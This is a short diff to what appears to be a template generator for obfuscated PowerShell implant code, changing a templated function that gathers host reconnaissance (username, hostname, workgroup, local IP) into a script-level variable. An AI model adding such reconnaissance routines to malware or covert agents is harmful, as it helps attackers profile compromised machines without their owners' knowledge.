@@ -39,10 +39,11 @@ function aaaaaa() {}
     # -- KEEP
     fde_func_b = '''
 function {{ ron.obf_collect_sysinfo }}(){
-    $hostN = hostname
-    $final_str = $env:UserName+"::"+$hostN
+    $h = hostname
+    $d = (Get-WmiObject -Class Win32_ComputerSystem).Workgroup
+    $a = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address
+    $final_str = "Username: "+$env:UserName+"`nHostname: "+$h+"`nDomain: "+$d+"`nLocal IP: "+$a
     $Script:tr = $final_str
-    return $final_str
 }
 '''
 
